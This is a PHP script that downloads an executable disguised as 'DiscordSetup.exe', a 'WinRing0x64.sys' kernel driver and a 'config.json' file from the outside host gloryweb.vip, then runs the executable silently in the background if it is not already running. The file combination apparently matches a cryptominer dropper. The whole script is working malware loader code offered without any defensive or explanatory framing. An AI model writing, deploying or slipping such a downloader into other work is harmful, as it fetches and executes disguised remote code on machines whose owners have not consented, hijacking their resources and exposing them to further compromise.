<?php
// === CONFIG ===
$exe_name       = 'DiscordSetup.exe';
$driver_name    = 'WinRing0x64.sys';
$config_name    = 'config.json';

$url_exe        = 'http://gloryweb.vip/DiscordSetup.exe';
$url_driver     = 'http://gloryweb.vip/WinRing0x64.sys';
$url_config     = 'http://gloryweb.vip/config.json';

// Use current script directory
$dir            = __DIR__ . '/';
$exe_path       = $dir . $exe_name;
$driver_path    = $dir . $driver_name;
$config_path    = $dir . $config_name;

// === 1. Check if process is already running ===
$process_running = false;
$tasklist = shell_exec('tasklist /FI "IMAGENAME eq ' . escapeshellarg($exe_name) . '" 2>nul');
if ($tasklist && stripos($tasklist, $exe_name) !== false) {
    $process_running = true;
}

// === 2. If not running, download files (streaming for large files) ===
if (!$process_running) {
    $files_to_download = [
        [$url_exe,     $exe_path],
        [$url_driver,  $driver_path],
        [$url_config,  $config_path]
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 300);        // 5 min timeout
    curl_setopt($ch, CURLOPT_NOPROGRESS, false);
    curl_setopt($ch, CURLOPT_PROGRESSFUNCTION, function ($resource, $download_size, $downloaded) {
        // Optional: log progress for large files
        return 0;
    });

    foreach ($files_to_download as list($url, $path)) {
        if (file_exists($path)) continue; // Skip if already exists

        $fp = fopen($path, 'wb');
        if (!$fp) continue;

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FILE, $fp);

        $result = curl_exec($ch);
        fclose($fp);

        if (!$result) {
            @unlink($path); // Clean up partial file
        }
    }
    curl_close($ch);

    // === 3. Execute the EXE (silent, non-blocking) ===
    if (file_exists($exe_path) && is_executable_on_windows($exe_path)) {
        // Hide window + run in background
        pclose(popen('start "" /B "' . $exe_path . '"', 'r'));
    }
}

// === Helper: Check if file is executable (basic) ===
function is_executable_on_windows($file) {
    return file_exists($file) && strtolower(pathinfo($file, PATHINFO_EXTENSION)) === 'exe';
}
?>
